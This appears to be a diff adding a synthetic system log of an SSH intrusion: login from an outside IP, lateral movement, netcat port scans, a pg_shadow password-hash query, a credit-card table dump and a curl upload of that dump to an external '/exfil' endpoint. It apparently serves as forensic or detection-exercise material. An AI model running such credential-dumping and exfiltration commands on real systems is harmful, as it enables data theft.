@@ -1,0 +1,24 @@
+Jul 28 10:00:01 jump-box sshd[4010]: Accepted password for admin from 185.220.103.50 port 44001 ssh2
+Jul 28 10:00:02 jump-box sshd[4010]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Jul 28 10:00:05 jump-box sshd[4015]: Accepted publickey for admin from 185.220.103.50 port 44002 ssh2
+Jul 28 10:01:00 jump-box sshd[4020]: Received disconnect from 185.220.103.50: disconnected by user
+Jul 28 10:01:02 jump-box sshd[4020]: pam_unix(sshd:session): session closed for user admin
+Jul 28 10:01:30 internal-app-01 sshd[5010]: Accepted publickey for admin from 10.0.1.1 port 44003 ssh2
+Jul 28 10:01:31 internal-app-01 sshd[5010]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Jul 28 10:02:00 internal-app-01 sudo[5015]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/hostnamectl set-hostname infected-node
+Jul 28 10:02:15 internal-app-01 sudo[5020]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/nc -zv 10.0.2.10 22
+Jul 28 10:02:20 internal-app-01 sudo[5025]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/nc -zv 10.0.2.20 22
+Jul 28 10:02:25 internal-app-01 sudo[5030]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/nc -zv 10.0.2.30 22
+Jul 28 10:02:30 internal-app-01 sudo[5035]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/nc -zv 10.0.2.40 22
+Jul 28 10:03:00 internal-app-01 sshd[5040]: Accepted password for admin from 10.0.2.10 port 44004 ssh2
+Jul 28 10:03:01 internal-app-01 sshd[5040]: pam_unix(sshd:session): session closed for user admin
+Jul 28 10:03:30 internal-db-01 sshd[6010]: Accepted password for admin from 10.0.1.1 port 44005 ssh2
+Jul 28 10:03:31 internal-db-01 sshd[6010]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Jul 28 10:04:00 internal-db-01 sudo[6015]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=postgres ; COMMAND=/bin/psql -c "SELECT usename, passwd FROM pg_shadow"
+Jul 28 10:04:15 internal-db-01 sudo[6020]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=postgres ; COMMAND=/bin/psql -c "COPY (SELECT * FROM credit_cards) TO '/tmp/dump.csv' DELIMITER ',' CSV HEADER"
+Jul 28 10:04:30 internal-db-01 sudo[6025]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/curl -F "file=@/tmp/dump.csv" http://185.220.103.50/exfil
+Jul 28 10:04:40 internal-db-01 sudo[6030]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/rm -f /tmp/dump.csv
+Jul 28 10:05:00 internal-db-01 sshd[6035]: Received disconnect from 10.0.1.1: disconnected by user
+Jul 28 10:05:02 internal-db-01 sshd[6035]: pam_unix(sshd:session): session closed for user admin
+Jul 28 10:05:30 jump-box sshd[4030]: Accepted publickey for admin from 185.220.103.50 port 44006 ssh2
+Jul 28 10:06:00 jump-box sudo[4035]:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/journalctl --no-pager -u sshd --since "2026-07-28 09:00:00"
